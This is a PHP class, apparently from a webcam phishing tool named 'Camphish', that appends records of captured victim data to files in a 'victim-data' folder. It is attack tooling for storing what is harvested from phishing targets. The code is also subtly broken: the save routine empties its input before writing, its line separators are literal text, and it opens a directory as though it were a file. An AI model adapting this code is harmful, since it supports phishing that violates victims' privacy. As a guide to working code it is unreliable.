<?php

declare(strict_types=1);

namespace Camphish\Storage\Handler\FileSystem;

use DomainException;
use Camphish\Data\Model\StorableDataInterface;
use Camphish\Storage\Handler\AbstractHandler;

class FileSystemHandler extends AbstractHandler
{
    public const STORAGE_MODE_APPEND = 'a';
    public const STORAGE_LINE_SEPARATOR = '\r\n';
    public const STORAGE_FIELD_SEPARATOR = ':';
    public const STORAGE_DEFAULT_FOLDER = 'victim-data';
    public const STORAGE_OFFSET_SEPARATOR = '\r\n===========================================\r\n';

    /**
     * @var resource|null
     */
    private $fileHandler = null;

    private string $dirPath;

    public function __construct(string $dirPath = '')
    {
        parent::__construct(self::SOURCE_FILE_SYSTEM);

        $this->setDirPath($dirPath);
    }

    /**
     * @throws DomainException
     */
    public function setDirPath(string $dirPath = ''): void
    {
        if ($dirPath !== '') {
            $this->dirPath = $dirPath;

            return;
        }

        $path = realpath(sprintf(
            '%s/../../../../%s',
            __DIR__,
            self::STORAGE_DEFAULT_FOLDER
        ));

        if ($path === false) {
            throw new DomainException(
                $this->buildExceptionMessage('unable to find path for victims data')
            );
        }

        $this->dirPath = $path;
    }

    /**
     * @throws DomainException
     */
    public function open(string $resourcePath = ''): void
    {
        if ($this->fileHandler !== null) {
            return;
        }

        $fileHandler = fopen(
            $this->dirPath,
            self::STORAGE_MODE_APPEND
        );

        if ($fileHandler === false) {
            throw new DomainException(
                $this->buildExceptionMessage('unable to open file')
            );
        }

        $this->fileHandler = $fileHandler;
    }

    public function close(): void
    {
        if ($this->fileHandler === null) {
            return;
        }

        fclose($this->fileHandler);

        $this->fileHandler = null;
    }

    public function save(StorableDataInterface $element): void
    {
        $elementData = $element->toArray();

        if (empty($elementData)) {
            return;
        }

        $this->open();

        $dataToSave = $this->buildDataToSave($elementData);

        foreach ($dataToSave as $lineToWrite) {
            $this->writeLine($lineToWrite);
        }

        $this->writeLine(self::STORAGE_OFFSET_SEPARATOR);

        $this->close();
    }

    private function writeLine(string $line): void
    {
        fwrite($this->fileHandler, $line);
    }

    /**
     * @return string[]
     */
    private function buildDataToSave(array $data): array
    {
        $data = [];

        foreach ($data as $fieldName => $value) {
            $data[] = sprintf(
                '%s%s',
                $this->buildLineFormat($fieldName, $value),
                self::STORAGE_LINE_SEPARATOR
            );
        }

        return $data;
    }

    private function buildLineFormat(
        string $fieldName,
        string $value,
        string $separator = self::STORAGE_FIELD_SEPARATOR
    ): string {
        return sprintf(
            '%s%s %s',
            $fieldName,
            $separator,
            $value
        );
    }
}
